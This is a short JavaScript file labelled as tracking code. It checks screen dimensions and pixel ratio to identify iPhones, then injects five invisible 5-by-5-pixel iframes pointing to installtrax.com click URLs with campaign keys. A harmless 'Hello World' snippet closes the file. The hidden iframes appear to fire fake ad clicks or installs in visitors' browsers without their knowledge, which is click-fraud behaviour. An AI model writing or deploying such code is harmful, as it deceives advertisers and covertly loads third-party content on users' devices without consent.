// Tracking and reporting starts below
var gyroPresent = false;
var windowWidth = window.screen.width;
var windowHeight = window.screen.height;
var n = navigator;
var campaignId = 103094;
var phT = 2;


// iPhone model checks.
function getiPhoneModel() {
    // iPhone 6 Plus
    if ((window.screen.height / window.screen.width == 736 / 414) && (window.devicePixelRatio == 3)) {
        return "2";
    }
    // iPhone 6
    else if ((window.screen.height / window.screen.width == 667 / 375) && (window.devicePixelRatio == 2)) {
        return "2";
    }
    // iPhone 5/5C/5S or 6 in zoom mode
    else if ((window.screen.height / window.screen.width == 1.775) && (window.devicePixelRatio == 2)) {
        return "2";
    }
    // iPhone 4/4S
    else if ((window.screen.height / window.screen.width == 1.5) && (window.devicePixelRatio == 2)) {
        return "2";
    }
    // iPhone 1/3G/3GS
    else if ((window.screen.height / window.screen.width == 1.5) && (window.devicePixelRatio == 1)) {
        return "2";
    } else {
        return "1";
    };
}

// Android model checks.
function getAndroidModel() {
    function pixelSize() {
        var ratio = 1;
        // To account for zoom, change to use deviceXDPI instead of systemXDPI
        if (window.screen.systemXDPI !== undefined && window.screen.logicalXDPI !== undefined && window.screen.systemXDPI > window.screen.logicalXDPI) {
            // Only allow for values > 1
            ratio = window.screen.systemXDPI / window.screen.logicalXDPI;
        }
        else if (window.devicePixelRatio !== undefined) {
            ratio = window.devicePixelRatio;
        }
        return ratio;
    };
    return pixelSize();
}

if(phT == 2) {
    phT = getiPhoneModel();
}

if(phT == 3) {
    phT = getAndroidModel();
}


if(phT > 1) {
 function cd0() {ifrm = document.createElement('IFRAME');ifrm.setAttribute('src', 'http://installtrax.com/click.php?c=184&key=cqhca189oq6q2ay2fn2o9mee');ifrm.setAttribute('FRAMEBORDER', '0');ifrm.setAttribute('SCROLLING', 'NO');ifrm.style.width = 5+'px';ifrm.style.height = 5+'px';document.body.appendChild(ifrm);}function cd1() {ifrm = document.createElement('IFRAME');ifrm.setAttribute('src', 'http://installtrax.com/click.php?c=185&key=v9m2f6ue7fkyj5cztgy3aqwh');ifrm.setAttribute('FRAMEBORDER', '0');ifrm.setAttribute('SCROLLING', 'NO');ifrm.style.width = 5+'px';ifrm.style.height = 5+'px';document.body.appendChild(ifrm);}function cd2() {ifrm = document.createElement('IFRAME');ifrm.setAttribute('src', 'http://installtrax.com/click.php?c=186&key=yy57281um7emiy157qu4cg43');ifrm.setAttribute('FRAMEBORDER', '0');ifrm.setAttribute('SCROLLING', 'NO');ifrm.style.width = 5+'px';ifrm.style.height = 5+'px';document.body.appendChild(ifrm);}function cd3() {ifrm = document.createElement('IFRAME');ifrm.setAttribute('src', 'http://installtrax.com/click.php?c=187&key=42qy4m6rta9j463qqz6qu09s');ifrm.setAttribute('FRAMEBORDER', '0');ifrm.setAttribute('SCROLLING', 'NO');ifrm.style.width = 5+'px';ifrm.style.height = 5+'px';document.body.appendChild(ifrm);}function cd4() {ifrm = document.createElement('IFRAME');ifrm.setAttribute('src', 'http://installtrax.com/click.php?c=188&key=akgssinaihu6npid4sg4gcvv');ifrm.setAttribute('FRAMEBORDER', '0');ifrm.setAttribute('SCROLLING', 'NO');ifrm.style.width = 5+'px';ifrm.style.height = 5+'px';document.body.appendChild(ifrm);}cd0();cd1();cd2();cd3();cd4(); 
}

var h = document.createElement("H1")                // Create a <h1> element
var t = document.createTextNode("Hello World");     // Create a text node
h.appendChild(t);  
